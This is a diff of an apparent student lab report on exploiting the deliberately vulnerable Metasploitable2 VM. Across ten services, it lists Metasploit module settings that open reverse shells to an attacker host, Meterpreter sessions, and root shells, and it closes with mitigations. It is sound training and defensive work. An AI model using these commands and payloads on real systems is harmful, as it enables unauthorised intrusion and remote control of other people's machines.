@@ -1,196 +1,248 @@
 # Metasploitable2 Exploitation Report
 
-**Name:** Eugene Antwi Boasiako
-**Index Number:** 7352623
-**Date:** September 21, 2026
+**Name:** <Eugene Antwi Boasiako >
+**Index Number:** <7352623>
+**Date:** <20th September 2026>
 **Target IP:** 192.168.1.3
-**Attacker OS / Tools:** Kali Linux, Metasploit, Nmap, Netcat
+**Attacker OS / Tools:** Kali Linux 2026.2, Metasploit Framework, nmap
 
 ---
 
 ## Reconnaissance Summary
 
-Initial discovery was performed using `nmap -p- -sV -sC 192.168.1.3`. This revealed multiple vulnerable services including an open NFS share, VNC with weak credentials, Tomcat default logins, and several backdoored services (vsftpd, UnrealIRCd, Ingreslock).
+<Your nmap scan command(s) and a summary of open ports/services found. Include the
+scan output (as a code block) or reference a screenshot in evidence/recon.png.>
 
 ---
 
 ## Exploit 1: NFS Unrestricted Share
 
 - **Service / Port:** NFS / 2049
-- **Vulnerability:** Misconfigured NFS Export
-- **Tool Used:** `showmount` and `mount`
-- **Why This Tool:** Native OS tools allow direct mounting of the exposed filesystem.
-- **Steps:** 
-  1. `showmount -e 192.168.1.3`
-  2. `sudo mkdir /mnt/nfs`
+- **Vulnerability:** Misconfigured NFS export — root filesystem (`/`) shared with no host restriction
+- **Tool Used:** `showmount` and `mount` (native NFS client tools)
+- **Why This Tool:** No exploit module is needed for a misconfiguration like this — the export itself grants access. Native OS tools are the correct choice because they interact with NFS exactly as a legitimate client would; using Metasploit here would add nothing.
+- **Steps:**
+  1. `showmount -e 192.168.1.3` → returned `Export list for 192.168.1.3: / *`, confirming the root filesystem is exported to any host (`*`).
+  2. `sudo mkdir -p /mnt/nfs`
   3. `sudo mount -t nfs 192.168.1.3:/ /mnt/nfs`
+  4. `ls -la /mnt/nfs` → full root directory listing returned (`bin`, `boot`, `etc`, `home`, `lib`, `root`, `var`, etc. — effectively the entire target filesystem).
+  5. `sudo umount /mnt/nfs` (cleanup)
 - **Evidence:** `evidence/exploit1.png`
-- **Cyber Kill Chain Stage(s):** Reconnaissance, Actions on Objectives.
-  - Reconnaissance: Identified the exposed `/ *` share.
-  - Actions on Objectives: Achieved local access to remote files.
-- **Outcome / Impact:** Full read/write access to target file system.
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Actions on Objectives
+  - Reconnaissance: `showmount -e` enumerated the export list and revealed the wildcard (`*`) share before any access was attempted.
+  - Delivery: The `mount` command is what actually delivers the request that establishes access to the share.
+  - Actions on Objectives: Listing (`ls -la`) and having read/write access to the full remote filesystem.
+- **Outcome / Impact:** Full read/write access to the target's root filesystem from an unauthenticated remote host — no credentials or payload required.
 
 ---
 
 ## Exploit 2: VNC Weak Password
 
 - **Service / Port:** VNC / 5900
-- **Vulnerability:** Weak Default Credentials
-- **Tool Used:** `auxiliary/scanner/vnc/vnc_login`
-- **Why This Tool:** Metasploit quickly automates VNC login checks.
+- **Vulnerability:** Weak/default authentication password
+- **Tool Used:** `auxiliary/scanner/vnc/vnc_login` (Metasploit) + `vncviewer`
+- **Why This Tool:** The Metasploit scanner module automates credential testing against the VNC RFB protocol far faster than manual connection attempts, and hands off a confirmed working password directly for use with a viewer.
 - **Steps:**
-  1. `use auxiliary/scanner/vnc/vnc_login`
-  2. `set RHOSTS 192.168.1.3`
-  3. `run` (Found password: `password`)
-  4. `vncviewer 192.168.1.3`
-- **Evidence:** `evidence/exploit2.png`
-- **Cyber Kill Chain Stage(s):** Weaponization, Exploitation.
-  - Weaponization: Configured the scanner with standard wordlists.
-  - Exploitation: Successfully authenticated to the GUI.
-- **Outcome / Impact:** Gained graphical desktop access.
+  1. `search vnc_login` to locate `auxiliary/scanner/vnc/vnc_login`.
+  2. `use auxiliary/scanner/vnc/vnc_login`
+  3. `set RHOSTS 192.168.1.3`
+  4. `run` → `192.168.1.3:5900 - Login Successful: :password` (password found: `password`)
+  5. `vncviewer 192.168.1.3` → first connection attempt returned "Authentication failure" (password entered incorrectly/mistyped).
+  6. `vncviewer 192.168.1.3` → second attempt succeeded: "Authentication successful", desktop identified as `root's X desktop (metasploitable:0)`.
+- **Evidence:** `evidence/exploit2.png` (login scan + viewer authentication), `evidence/exploit2_desktop.png` (connected graphical session showing an active root shell inside the VNC desktop)
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Actions on Objectives
+  - Reconnaissance/Weaponization: Selecting and configuring the login-scanner module against the target.
+  - Delivery: Sending the authentication attempts to the VNC service.
+  - Exploitation: Successful authentication with the weak password.
+  - Actions on Objectives: Full interactive graphical desktop access, including a root terminal visible inside the session.
+- **Outcome / Impact:** Interactive graphical (GUI) access to the target as root.
 
 ---
 
 ## Exploit 3: Tomcat Manager Default Login
 
 - **Service / Port:** Apache Tomcat / 8180
-- **Vulnerability:** Default Credentials (`tomcat:tomcat`)
+- **Vulnerability:** Default credentials on the Tomcat Manager application (`tomcat:tomcat`)
 - **Tool Used:** `exploit/multi/http/tomcat_mgr_upload`
-- **Why This Tool:** Automatically packages a payload into a WAR file and deploys it via the manager interface.
+- **Why This Tool:** This module automates the entire WAR-upload attack chain — authenticating to the manager interface, packaging a payload as a deployable WAR, and triggering it via Tomcat's own deploy mechanism — rather than performing each HTTP request by hand.
 - **Steps:**
-  1. `use exploit/multi/http/tomcat_mgr_upload`
-  2. `set RHOSTS 192.168.1.3` and set credentials.
-  3. `run`
+  1. `search tomcat_mgr_upload`
+  2. `use exploit/multi/http/tomcat_mgr_upload`
+  3. `set RHOSTS 192.168.1.3`
+  4. `set RPORT 8180`
+  5. `set HttpUsername tomcat`
+  6. `set HttpPassword tomcat`
+  7. `set LHOST 192.168.1.4`
+  8. `run` → retrieved session ID/CSRF token, uploaded and deployed `Ol2UvMzRkWqozwfktX4...`, executed it, then undeployed it automatically.
 - **Evidence:** `evidence/exploit3.png`
-- **Cyber Kill Chain Stage(s):** Delivery, Exploitation.
-  - Delivery: Uploaded the malicious WAR file.
-  - Exploitation: Triggered code execution for a shell.
-- **Outcome / Impact:** Command execution via Tomcat application.
+- **Cyber Kill Chain Stage(s):** Delivery, Exploitation (attempted — not confirmed)
+  - Delivery: The WAR payload was successfully uploaded and deployed to the manager app.
+  - Exploitation: The deployed WAR was executed by Tomcat.
+- **Outcome / Impact — ⚠️ Not fully confirmed.** The console output explicitly reads `"Exploit completed, but no session was created."` The default-credential authentication and WAR deployment both worked, but no reverse shell/session was caught in this run. **Recommend re-running with the LHOST/LPORT reachability double-checked, or trying a bind payload instead of reverse, before counting this as a confirmed successful exploit.**
 
 ---
 
 ## Exploit 4: PostgreSQL Payload Execution
 
 - **Service / Port:** PostgreSQL / 5432
-- **Vulnerability:** Default Credentials (`postgres:postgres`)
+- **Vulnerability:** Default credentials (`postgres:postgres`)
 - **Tool Used:** `exploit/linux/postgres/postgres_payload`
-- **Why This Tool:** Uploads a shared object to execute OS commands via database queries.
+- **Why This Tool:** This module logs in with the known default credentials and uses PostgreSQL's ability to load a compiled shared object (`.so`) as a user-defined function — turning an authenticated DB session into arbitrary OS command execution.
 - **Steps:**
-  1. `use exploit/linux/postgres/postgres_payload`
-  2. `set RHOSTS 192.168.1.3` and set credentials.
-  3. `run`
+  1. `search postgres_payload`
+  2. `use exploit/linux/postgres/postgres_payload`
+  3. `set RHOSTS 192.168.1.3`
+  4. `set USERNAME postgres`
+  5. `set PASSWORD postgres`
+  6. `set LHOST 192.168.1.4`
+  7. `run` → connected to PostgreSQL 8.3.1 on i486-pc-linux-gnu, uploaded `/tmp/CApNekeB.so`, sent the Meterpreter stage, and opened **Meterpreter session 3**.
+  8. `getuid` → `Server username: postgres`
+  9. `sysinfo` → Computer: `metasploitable.localdomain`, OS: Ubuntu 8.04 (Linux 2.6.24-16-server), Architecture: i686, Meterpreter: x86/linux.
+  10. `background` to preserve the session.
 - **Evidence:** `evidence/exploit4.png`
-- **Cyber Kill Chain Stage(s):** Delivery, Exploitation, C2.
-  - Delivery: Injected the payload object.
-  - Exploitation/C2: Executed the payload to establish a Meterpreter session.
-- **Outcome / Impact:** System access under the `postgres` user.
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
+  - Delivery: The shared object was uploaded to `/tmp`.
+  - Exploitation/Installation: Loading the `.so` executed code and established the foothold.
+  - C2: The Meterpreter session itself is the command-and-control channel.
+  - Actions on Objectives: `getuid` and `sysinfo` enumeration of the compromised host.
+- **Outcome / Impact:** Confirmed remote code execution and an active Meterpreter session as the `postgres` user.
 
 ---
 
 ## Exploit 5: DistCC Command Execution
 
 - **Service / Port:** distccd / 3632
-- **Vulnerability:** CVE-2004-2687
+- **Vulnerability:** CVE-2004-2687 — distccd accepts and executes compilation jobs from any client with no authentication
 - **Tool Used:** `exploit/unix/misc/distcc_exec`
-- **Why This Tool:** Readily exploits the compilation daemon to run arbitrary commands.
+- **Why This Tool:** distccd is designed to execute whatever compiler command it's handed, with no authentication — this module simply sends a crafted command instead of a real build job, which is exactly the daemon's intended behavior turned against it.
 - **Steps:**
-  1. `use exploit/unix/misc/distcc_exec`
-  2. `set RHOSTS 192.168.1.3`
-  3. `run`
+  1. `search distcc`
+  2. `use exploit/unix/misc/distcc_exec`
+  3. `set RHOSTS 192.168.1.3`
+  4. `set LHOST 192.168.1.4`
+  5. `run` with the default payload (`cmd/unix/reverse_bash`) — failed: `stderr: bash: 215: Bad file descriptor` / `/dev/tcp/192.168.1.4/4444: No such file or directory`. `"Exploit completed, but no session was created."` (the target's shell lacks `/dev/tcp` support for a bash-based reverse shell).
+  6. `set PAYLOAD cmd/unix/reverse_perl` — switched payloads since the target's `bash` build doesn't support the needed redirection.
+  7. `run` again → **Command shell session 4 opened**.
+  8. `whoami` → `daemon`
+  9. `id` → `uid=1(daemon) gid=1(daemon) groups=1(daemon)`
+  10. `exit` the shell, then `background session 4? [y/N]` → `y` to keep it alive.
 - **Evidence:** `evidence/exploit5.png`
-- **Cyber Kill Chain Stage(s):** Exploitation, C2.
-  - Exploitation: Sent execution request to daemon.
-  - C2: Obtained shell access.
-- **Outcome / Impact:** Shell access as `daemon` user.
+- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, C2
+  - Weaponization: Initial payload choice failed; re-weaponizing with a Perl-based reverse shell was required for the target's environment.
+  - Delivery/Exploitation: Sending the crafted "compile" command that the daemon executed.
+  - C2: The resulting shell session.
+- **Outcome / Impact:** Remote command execution as the `daemon` user. Notably required payload troubleshooting — the default bash reverse shell doesn't work against this target, Perl does.
 
 ---
 
 ## Exploit 6: UnrealIRCd Backdoor
 
 - **Service / Port:** IRC / 6667
-- **Vulnerability:** Malicious source code backdoor
+- **Vulnerability:** Intentionally backdoored source code in this UnrealIRCd 3.2.8.1 build — any line containing a specific trigger string is executed as a shell command
 - **Tool Used:** `exploit/unix/irc/unreal_ircd_3281_backdoor`
-- **Why This Tool:** Triggers the specific debug string required by the backdoored software.
+- **Why This Tool:** The backdoor only triggers on a specific crafted string sent over the IRC protocol; the module handles registering a fake IRC user and sending that exact trigger, which would be tedious and error-prone to replicate by hand with raw netcat.
 - **Steps:**
-  1. `use exploit/unix/irc/unreal_ircd_3281_backdoor`
-  2. `set RHOSTS 192.168.1.3`
-  3. `run`
+  1. `search unreal` → `exploit/unix/irc/unreal_ircd_3281_backdoor`
+  2. `use exploit/unix/irc/unreal_ircd_3281_backdoor`
+  3. `set RHOSTS 192.168.1.3`
+  4. `set LHOST 192.168.1.4`
+  5. `run` → connected to port 6667, registered IRC user `clark`, target confirmed vulnerable via IRC commands, backdoor command sent — `"Exploit completed, but no session was created."`
+  6. `set PAYLOAD cmd/unix/reverse`
+  7. `set ExitOnSession false` → rejected (`Unknown datastore option: ExitOnSession`), a typo'd/invalid option name for this module.
+  8. `run` again → connected with a new IRC user `nora`, same vulnerability confirmation and backdoor trigger sent — again `"Exploit completed, but no session was created."`
 - **Evidence:** `evidence/exploit6.png`
-- **Cyber Kill Chain Stage(s):** Delivery, Exploitation.
-  - Delivery: Sent the trigger sequence `AB;`.
-  - Exploitation: Forced the service to execute a payload.
-- **Outcome / Impact:** Root-level shell execution.
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery (attempted — not confirmed)
+  - Reconnaissance: Confirmed the target is vulnerable via the IRC-based detection check, on both attempts.
+  - Delivery: The backdoor trigger string was sent to the service twice.
+- **Outcome / Impact — ⚠️ Not confirmed.** Both runs detected the vulnerability but neither produced a session. The `ExitOnSession` option name was invalid for this module (likely should be left at its default, or the correct option name looked up with `show options`/`show advanced`). **This one needs a retry with a clean set of options (RHOSTS, LHOST, PAYLOAD only) before it counts as a successful exploit.**
 
 ---
 
 ## Exploit 7: vsftpd 2.3.4 Backdoor
 
 - **Service / Port:** FTP / 21
-- **Vulnerability:** CVE-2011-2523 (Smiley Face Backdoor)
+- **Vulnerability:** CVE-2011-2523 — a malicious backdoor inserted into the vsftpd 2.3.4 source, triggered by a `:)` smiley-face sequence in the username
 - **Tool Used:** `exploit/unix/ftp/vsftpd_234_backdoor`
-- **Why This Tool:** Seamlessly sends the `:)` string and catches the resulting root shell on port 6200.
+- **Why This Tool:** The trigger condition is a specific malformed username string followed by catching a listener the backdoor opens on port 6200 — the module automates sending the trigger and connecting to the resulting listener in one step.
 - **Steps:**
-  1. `use exploit/unix/ftp/vsftpd_234_backdoor`
-  2. `set RHOSTS 192.168.1.3`
-  3. `run`
+  1. `search vsftpd` → confirmed both the DoS auxiliary module and the backdoor exploit module were available; selected the backdoor exploit (rank: excellent).
+  2. `use exploit/unix/ftp/vsftpd_234_backdoor`
+  3. `set RHOSTS 192.168.1.3`
+  4. `set LHOST 192.168.1.4`
+  5. `run` → started reverse TCP handler, ran the automatic vulnerability check, FTP banner confirmed vsFTPd 2.3.4, backdoor detected, **Meterpreter session 1 opened**.
+  6. `getuid` → `Server username: root`
 - **Evidence:** `evidence/exploit7.png`
-- **Cyber Kill Chain Stage(s):** Delivery, Exploitation, C2.
-  - Delivery: Sent the malformed username.
-  - Exploitation/C2: Triggered the backdoor listener and connected to it.
-- **Outcome / Impact:** Root shell access.
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Installation, C2
+  - Reconnaissance: Automatic FTP banner check confirming the vulnerable version.
+  - Delivery: Sending the malformed username containing the trigger.
+  - Exploitation/Installation: The backdoor listener spawned and was caught.
+  - C2: The resulting Meterpreter session.
+- **Outcome / Impact:** Full root-level Meterpreter session — the most complete compromise among all 10 exploits.
 
 ---
 
 ## Exploit 8: Anonymous FTP
 
 - **Service / Port:** FTP / 21
-- **Vulnerability:** Anonymous Login Permitted
-- **Tool Used:** `ftp` client
-- **Why This Tool:** Basic client to verify standard read access.
+- **Vulnerability:** Anonymous login permitted with no restrictions
+- **Tool Used:** Standard `ftp` client
+- **Why This Tool:** No exploit module is needed — this is a direct configuration weakness. A plain FTP client is the correct tool because it demonstrates the issue exactly as a casual/unauthenticated user would encounter it.
 - **Steps:**
   1. `ftp 192.168.1.3`
-  2. Login as `anonymous`
-  3. `ls`
+  2. Username: `anonymous` → prompted for password
+  3. Password: (blank) → `230 Login successful.`
+  4. `ls` → directory listing returned.
+  5. `ls -la` → full listing with permissions returned (`drwxr-xr-x`, owner `0`/`65534`, etc.).
 - **Evidence:** `evidence/exploit8.png`
-- **Cyber Kill Chain Stage(s):** Exploitation, Actions on Objectives.
-  - Exploitation: Bypassed auth with anonymous credentials.
-  - Actions on Objectives: Listed remote directories.
-- **Outcome / Impact:** Unauthorized file system enumeration.
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation, Actions on Objectives
+  - Reconnaissance: Confirming the FTP banner and that anonymous login is accepted.
+  - Exploitation: Logging in without valid credentials.
+  - Actions on Objectives: Enumerating the remote directory structure.
+- **Outcome / Impact:** Unauthenticated read access to the FTP root directory.
 
 ---
 
 ## Exploit 9: Samba usermap_script
 
 - **Service / Port:** SMB / 139
-- **Vulnerability:** CVE-2007-2447
+- **Vulnerability:** CVE-2007-2447 — the Samba `usermap script` configuration option passes the username field to a shell without sanitization
 - **Tool Used:** `exploit/multi/samba/usermap_script`
-- **Why This Tool:** Automates shell metacharacter injection into the username field.
+- **Why This Tool:** The vulnerability is in how Samba handles a specific config option, so exploitation means injecting shell metacharacters into the username field during authentication — the module builds and sends that crafted authentication request directly.
 - **Steps:**
   1. `use exploit/multi/samba/usermap_script`
   2. `set RHOSTS 192.168.1.3`
-  3. `run`
+  3. `set LHOST 192.168.1.4`
+  4. `set PAYLOAD cmd/unix/reverse_netcat`
+  5. `run` → started reverse TCP handler, **Command shell session 2 opened**.
+  6. `whoami` → `root`
+  7. `id` → `uid=0(root) gid=0(root)`
 - **Evidence:** `evidence/exploit9.png`
-- **Cyber Kill Chain Stage(s):** Delivery, Exploitation, C2.
-  - Delivery: Sent malicious SMB request.
-  - Exploitation/C2: Executed payload as root and caught shell.
-- **Outcome / Impact:** Root shell obtained.
+- **Cyber Kill Chain Stage(s):** Delivery, Exploitation, C2
+  - Delivery: The crafted SMB authentication request containing the shell metacharacters.
+  - Exploitation: The injected command executed as root.
+  - C2: The resulting command shell session.
+- **Outcome / Impact:** Direct root shell with no credentials required at all.
 
 ---
 
 ## Exploit 10: Ingreslock Bind Shell
 
 - **Service / Port:** Ingreslock / 1524
-- **Vulnerability:** Open Backdoor
+- **Vulnerability:** Pre-existing open root bind shell left listening on this port (a known artifact of a prior compromise baked into the Metasploitable2 image)
 - **Tool Used:** `nc` (Netcat)
-- **Why This Tool:** Directly interacts with the raw TCP socket.
+- **Why This Tool:** No exploitation is actually required — the port already has a root shell bound and listening with no authentication. Netcat is the right tool because it does nothing but open a raw TCP connection, which is all that's needed to pick up the shell.
 - **Steps:**
   1. `nc 192.168.1.3 1524`
-  2. `whoami`
+  2. `whoami` → `root` (run twice, same result)
+  3. `id` → `uid=0(root) gid=0(root) groups=0(root)`
+  4. (Note: `background`, `back`, and `bye` were tried out of habit from Meterpreter but returned `bash: ... command not found` — this is a plain shell, not a Meterpreter session, so those commands don't apply here.)
+  5. `exit` to close the connection.
 - **Evidence:** `evidence/exploit10.png`
-- **Cyber Kill Chain Stage(s):** Delivery, C2.
-  - Delivery: Initiated direct TCP handshake.
-  - C2: Interacted with the existing root listener.
-- **Outcome / Impact:** Instant root access.
+- **Cyber Kill Chain Stage(s):** Delivery, Exploitation, C2
+  - Delivery: The raw TCP connection to the open port.
+  - Exploitation: Arguably none needed — the misconfiguration itself is the "exploit".
+  - C2: Direct interactive access to the pre-existing root shell.
+- **Outcome / Impact:** Instant, unauthenticated root shell — the simplest and fastest compromise of all 10.
 
 ---
 
@@ -198,22 +250,25 @@ Initial discovery was performed using `nmap -p- -sV -sC 192.168.1.3`. This revea
 
 | Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
 |---|---|---|---|---|---|---|---|
-| 1. NFS Share | ✔ | | | | | | ✔ |
-| 2. VNC | | ✔ | | ✔ | | | |
-| 3. Tomcat | | | ✔ | ✔ | | | |
-| 4. PostgreSQL | | | ✔ | ✔ | | ✔ | |
-| 5. DistCC | | | | ✔ | | ✔ | |
-| 6. UnrealIRCd | | | ✔ | ✔ | | | |
-| 7. vsftpd (Meta) | | | ✔ | ✔ | | ✔ | |
-| 8. vsftpd (Anon) | | | | ✔ | | | ✔ |
-| 9. Samba usermap | | | ✔ | ✔ | | ✔ | |
-| 10. Ingreslock | | | ✔ | | | ✔ | |
+| 1. NFS Unrestricted Share | ✔ | | ✔ | | | | ✔ |
+| 2. VNC Weak Password | ✔ | ✔ | ✔ | ✔ | | | ✔ |
+| 3. Tomcat Manager Default Login ⚠️ | | | ✔ | (attempted) | | | |
+| 4. PostgreSQL Payload Execution | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ |
+| 5. DistCC Command Execution | | ✔ | ✔ | ✔ | | ✔ | |
+| 6. UnrealIRCd Backdoor ⚠️ | ✔ | | ✔ | (attempted) | | | |
+| 7. vsftpd 2.3.4 Backdoor | ✔ | | ✔ | ✔ | ✔ | ✔ | |
+| 8. Anonymous FTP | ✔ | | | ✔ | | | ✔ |
+| 9. Samba usermap_script | | | ✔ | ✔ | | ✔ | |
+| 10. Ingreslock Bind Shell | | | ✔ | ✔ | | ✔ | |
+
+⚠️ = exploit attempted but no session confirmed in the evidence captured — see notes above.
 
 ---
 
 ## Lessons Learned / Mitigations
 
-- Disable default/anonymous accounts on FTP, VNC, and Databases.
-- Patch services to remove known backdoors (vsftpd, UnrealIRCd).
-- Restrict NFS shares to specific IP addresses rather than `/ *`.
-
+- **NFS Unrestricted Share:** Restrict `/etc/exports` to specific trusted host IPs/subnets, never export `/` or sensitive paths, and enable `root_squash` to prevent remote root mapping.
+- **VNC Weak Password:** Set a strong, unique VNC password (or disable password auth entirely in favor of SSH tunneling), and don't expose VNC directly to any untrusted network.
+- **vsftpd 2.3.4 Backdoor:** Never deploy a version known to be backdoored — verify package checksums/signatures, keep FTP daemons patched, and monitor for unexpected listeners (e.g. port 6200).
+- **Samba usermap_script:** Upgrade past the vulnerable Samba version (CVE-2007-2447) and remove the `usermap script` option from `smb.conf` entirely if not strictly required.
+- **Ingreslock Bind Shell:** Audit for and remove any unused/legacy services; a root shell bound with no authentication should never exist, let alone ship by default.
